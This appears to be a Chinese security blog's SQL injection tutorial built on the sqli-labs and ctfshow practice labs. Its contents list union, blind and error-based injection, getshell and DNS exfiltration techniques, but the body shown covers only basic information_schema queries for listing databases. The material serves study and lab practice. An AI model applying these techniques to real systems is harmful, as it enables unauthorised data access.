
<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="UTF-8" />
  <title>MySQL注入 Re:Master | 雲流のLowest World</title>
  <meta name="author" content="C1oudfL0w0" />
  <meta name="description" content="" />
  <meta name="keywords" content="" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
  <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
  <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>


<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/js/lib/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/js/lib/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/js/lib/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/js/lib/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
  <!--flag{never_g0nna g1ve_you up}-->

  <!-- 页面点击特效 -->
  <script type="text/javascript" src="/blog/js/love-click.js"></script>

  <!-- 浏览器标题 -->
  <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

  <!-- 动态背景 -->
  

  <!--文章目录-->
  
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">MySQL基本语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">Sql注入原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-number">4.</span> <span class="toc-text">注入位置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.</span> <span class="toc-text">注入类型</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">6.</span> <span class="toc-text">万能密码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-less-1%EF%BC%88%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%89"><span class="toc-number">7.1.</span> <span class="toc-text">sqli-labs less-1（字符型）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD"><span class="toc-number">7.1.1.</span> <span class="toc-text">注入点判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E5%88%97%E6%95%B0"><span class="toc-number">7.1.2.</span> <span class="toc-text">判断回显列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%89%8D%E7%AB%AF%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">7.1.3.</span> <span class="toc-text">判断前端回显位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">7.1.4.</span> <span class="toc-text">查询数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-number">7.1.5.</span> <span class="toc-text">查询数据库中的表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%88%97%E5%90%8D"><span class="toc-number">7.1.6.</span> <span class="toc-text">查表中的列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9B%B8%E5%BA%94%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC"><span class="toc-number">7.1.7.</span> <span class="toc-text">查相应字段的值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-less-11%EF%BC%88POST%EF%BC%89"><span class="toc-number">7.2.</span> <span class="toc-text">sqli-labs less-11（POST）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-less-2%EF%BC%88%E6%95%B0%E5%AD%97%E5%9E%8B%EF%BC%89"><span class="toc-number">7.3.</span> <span class="toc-text">sqli-labs less-2（数字型）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-less-3-amp-4-amp-12%EF%BC%88%E6%9B%B4%E5%A4%9A%E9%97%AD%E5%90%88%E7%B1%BB%E5%9E%8B%EF%BC%89"><span class="toc-number">7.4.</span> <span class="toc-text">sqli-labs less-3&amp;4&amp;12（更多闭合类型）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">7.5.</span> <span class="toc-text">无列名联合注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99"><span class="toc-number">8.1.</span> <span class="toc-text">数据库报错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml"><span class="toc-number">8.2.</span> <span class="toc-text">updatexml</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-labs-less-5-amp-6"><span class="toc-number">8.2.1.</span> <span class="toc-text">sqli-labs less-5&amp;6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow-web244"><span class="toc-number">8.2.2.</span> <span class="toc-text">ctfshow web244</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#extractvalue"><span class="toc-number">8.3.</span> <span class="toc-text">extractvalue</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow-web245"><span class="toc-number">8.3.1.</span> <span class="toc-text">ctfshow web245</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#group-by-x2F-floor%E6%B3%A8%E5%85%A5"><span class="toc-number">8.4.</span> <span class="toc-text">group by &#x2F; floor注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">8.4.1.</span> <span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%88%86%E6%9E%90"><span class="toc-number">8.4.2.</span> <span class="toc-text">报错分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow-web246"><span class="toc-number">8.4.3.</span> <span class="toc-text">ctfshow web246</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">8.5.</span> <span class="toc-text">join 无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">8.5.1.</span> <span class="toc-text">字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8%E5%90%8D"><span class="toc-number">8.5.2.</span> <span class="toc-text">表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%93%E5%90%8D"><span class="toc-number">8.5.3.</span> <span class="toc-text">库名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">9.</span> <span class="toc-text">MySQL 文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E5%88%B0%E6%96%87%E4%BB%B6"><span class="toc-number">9.1.</span> <span class="toc-text">导出数据到文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C%E5%86%99%E6%96%87%E4%BB%B6%E5%B8%A6%E5%A4%96"><span class="toc-number">9.1.1.</span> <span class="toc-text">查询结果写文件带外</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sqli-labs-less-7"><span class="toc-number">9.1.1.1.</span> <span class="toc-text">sqli-labs less-7</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-number">9.1.2.</span> <span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDF%E6%B3%A8%E5%85%A5"><span class="toc-number">9.2.</span> <span class="toc-text">UDF注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow-web248"><span class="toc-number">9.2.1.</span> <span class="toc-text">ctfshow web248</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97-x2F-%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97"><span class="toc-number">9.3.</span> <span class="toc-text">全局日志&#x2F;慢查询日志</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">10.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">10.1.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-1"><span class="toc-number">10.1.1.</span> <span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE"><span class="toc-number">10.1.2.</span> <span class="toc-text">判断回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-labs-less-8"><span class="toc-number">10.1.3.</span> <span class="toc-text">sqli-labs less-8</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">10.2.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-labs-less-9-amp-10"><span class="toc-number">10.2.1.</span> <span class="toc-text">sqli-labs less-9&amp;10</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">11.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-less-24"><span class="toc-number">11.1.</span> <span class="toc-text">sqli-labs less-24</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">12.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-less-32"><span class="toc-number">12.1.</span> <span class="toc-text">sqli-labs less-32</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">13.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9"><span class="toc-number">13.1.</span> <span class="toc-text">修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%84%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E5%AE%9E%E4%BE%8B"><span class="toc-number">13.2.</span> <span class="toc-text">各个数据库堆叠查询实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6"><span class="toc-number">13.3.</span> <span class="toc-text">DNS数据外带</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-less-38"><span class="toc-number">13.4.</span> <span class="toc-text">sqli-labs less-38</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E6%97%A5%E5%BF%97%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">13.4.1.</span> <span class="toc-text">开启日志写文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-number">13.5.</span> <span class="toc-text">预处理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlmap%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-number">14.</span> <span class="toc-text">Sqlmap一把梭</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#insert%E6%B3%A8%E5%85%A5"><span class="toc-number">15.</span> <span class="toc-text">insert注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#update%E6%B3%A8%E5%85%A5"><span class="toc-number">16.</span> <span class="toc-text">update注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#delete%E6%B3%A8%E5%85%A5"><span class="toc-number">17.</span> <span class="toc-text">delete注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#limit%E6%B3%A8%E5%85%A5"><span class="toc-number">18.</span> <span class="toc-text">limit注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%95"><span class="toc-number">18.1.</span> <span class="toc-text">联合查询法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#procedure-analyse-%E5%87%BD%E6%95%B0"><span class="toc-number">18.2.</span> <span class="toc-text">procedure analyse()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%B3%95"><span class="toc-number">18.3.</span> <span class="toc-text">报错注入法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5%E6%B3%95"><span class="toc-number">18.4.</span> <span class="toc-text">时间注入法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#finfo%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">19.</span> <span class="toc-text">finfo文件注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#finfo%E7%B1%BB"><span class="toc-number">19.1.</span> <span class="toc-text">finfo类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-ini%E5%92%8C%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="toc-number">19.2.</span> <span class="toc-text">.user.ini和短标签绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#quine%E6%B3%A8%E5%85%A5"><span class="toc-number">20.</span> <span class="toc-text">quine注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">21.</span> <span class="toc-text">限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8D%E6%95%B0%E9%95%BF%E5%BA%A6%E4%B8%8D%E8%B6%B3"><span class="toc-number">21.1.</span> <span class="toc-text">位数长度不足</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4"><span class="toc-number">21.2.</span> <span class="toc-text">输入过滤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">22.</span> <span class="toc-text">防御</span></a></li></ol>
    </div>
    <script>
    (function () {
        function initTocHighlight() {
            var tocLinks = document.querySelectorAll('#toc .toc-link');
            if (!tocLinks.length) return;

            // 收集所有标题锚点对应的 DOM 元素
            var headings = [];
            tocLinks.forEach(function (link) {
                var href = link.getAttribute('href');
                if (!href) return;
                var id = decodeURIComponent(href.slice(1));
                var el = document.getElementById(id);
                if (el) headings.push({ el: el, link: link });
            });
            if (!headings.length) return;

            var activeLink = null;
            var offset = 80;

            function highlight() {
                var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
                var current = null;

                for (var i = 0; i < headings.length; i++) {
                    if (headings[i].el.getBoundingClientRect().top <= offset + 10) {
                        current = headings[i];
                    }
                }

                // 仅在用户确实滚动过、且到达页面底部时，才强制高亮最后一个
                if (scrollTop > 100 && window.innerHeight + scrollTop >= document.documentElement.scrollHeight - 50) {
                    current = headings[headings.length - 1];
                }

                // 页面顶部且没有标题进入视口时，高亮第一个
                if (scrollTop == 0) {
                    current = headings[0];
                }

                if (current && current.link !== activeLink) {
                    // 清除所有高亮
                    tocLinks.forEach(function (link) {
                        link.classList.remove('toc-active');
                    });

                    // 高亮当前项
                    current.link.classList.add('toc-active');
                    activeLink = current.link;

                    // TOC 容器自动滚动，使当前项可见
                    var tocEl = document.getElementById('toc');
                    var linkRect = activeLink.getBoundingClientRect();
                    var tocRect = tocEl.getBoundingClientRect();
                    if (linkRect.top < tocRect.top || linkRect.bottom > tocRect.bottom) {
                        activeLink.scrollIntoView({ block: 'center', behavior: 'smooth' });
                    }
                } else if (!current && activeLink) {
                    tocLinks.forEach(function (link) {
                        link.classList.remove('toc-active');
                    });
                    activeLink = null;
                }
            }

            var ticking = false;
            window.addEventListener('scroll', function () {
                if (!ticking) {
                    requestAnimationFrame(function () {
                        highlight();
                        ticking = false;
                    });
                    ticking = true;
                }
            });

            // 初始高亮
            highlight();
        }

        // 等待页面完全加载后再初始化（确保文章标题 DOM 已渲染）
        if (document.readyState === 'complete') {
            initTocHighlight();
        } else {
            window.addEventListener('load', initTocHighlight);
        }
    })();
    </script>
  

  <!--返回顶部-->
  <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
    <a title="返回顶部">↑</a>
  </div>
  <script src="/blog/js/totop.js"></script>

  <div id="layout">
    
    <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
    
    <transition name="fade">
      <div id="loading" v-show="loading">
        <div id="loading-circle">
          <h2>LOADING</h2>
          <p>第一次加载文章图片可能会花费较长时间</p>
          <p>要不挂个梯子试试？（x</p>
          <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
          <img src="/blog/images/loading.gif" />
        </div>
      </div>
    </transition>
    <transition name="into">
      <div id="main" v-show="!loading">
        <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

        <div class="article">
    <div>
        <h1>MySQL注入 Re:Master</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/3/16
        </span>
        
        <span class="category">
            <a href="/blog/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/Sql/" style="color: #03a9f4">Sql</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">12.8k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">55分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>重制中…</p>
<p>基于 ctfshow 上的 sqli-labs 再出发</p>
<p>环境：Mysql 5.7.26 + Navicat</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805">https://blog.csdn.net/qq_44159028/article/details/114325805</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ning1022/SQLInjectionWiki">https://github.com/ning1022/SQLInjectionWiki</a></p>
<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html">https://www.sqlsec.com/2020/05/sqlilabs.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/426188.html">https://www.freebuf.com/articles/web/426188.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mr-ryan/p/17687652.html">https://www.cnblogs.com/mr-ryan/p/17687652.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_49150931/article/details/111829828">https://blog.csdn.net/weixin_49150931/article/details/111829828</a></p>
<span id="more"></span>

<hr>
<h1 id="MySQL基本语法"><a href="#MySQL基本语法" class="headerlink" title="MySQL基本语法"></a>MySQL基本语法</h1><p><a href="https://c1oudfl0w0.github.io/blog/2023/05/05/SQL%E8%AF%AD%E6%B3%95/">https://c1oudfl0w0.github.io/blog/2023/05/05/SQL语法/</a></p>
<p><strong>information_schema库</strong>：</p>
<p>在MySQL 5.0版本之后，MySQL默认在数据库中存放一个名为 <code>information_schema</code> 的数据库，其中有三个表：</p>
<ul>
<li><p>SCHEMATA 表：存储该用户创建的所有数据库的库名，该表中记录数据库库名的字段名为 SCHEMA_NAME</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414194130915.png" alt="image-20250414194130915"></p>
</li>
<li><p>TABLES 表：存储该用户创建的所有数据库的库名和表名，记录数据库库名和表名的字段名分别为 TABLE_SCHEMA 和 TABLE_NAME</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414194642480.png" alt="image-20250414194642480"></p>
</li>
<li><p>COLUMNS 表：存储该用户创建的所有数据库的库名、表名和字段名，该表中记录数据库库名、表名和字段名的字段名分别为TABLE_ SCHEMA、TABLE_NAME和COLUMN_NAME</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414194805123.png" alt="image-20250414194805123"></p>
</li>
</ul>
<p><strong>基础 select 查询语句</strong>：</p>
<p>以这样的一个表为例</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250318202417482.png" alt="image-20250318202417482"></p>
<p>通过查询 <code>mysql.innodb_table_stats</code> 获取所有的数据库</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> database_name <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250318200339106.png" alt="image-20250318200339106"></p>
<p>也可以查询 <code>information_schema.SCHEMA_NAME</code> 获取：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> SCHEMA_NAME <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>SCHEMATA<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<br>

<p>通常对后端数据库查询，返回到服务器的都是第一行的结果，为了让所有的查询结果都在第一行，需要使用<code>group_concat</code>函数</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>database_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250318200656467.png" alt="image-20250318200656467"></p>
<p>查当前数据库名</p>
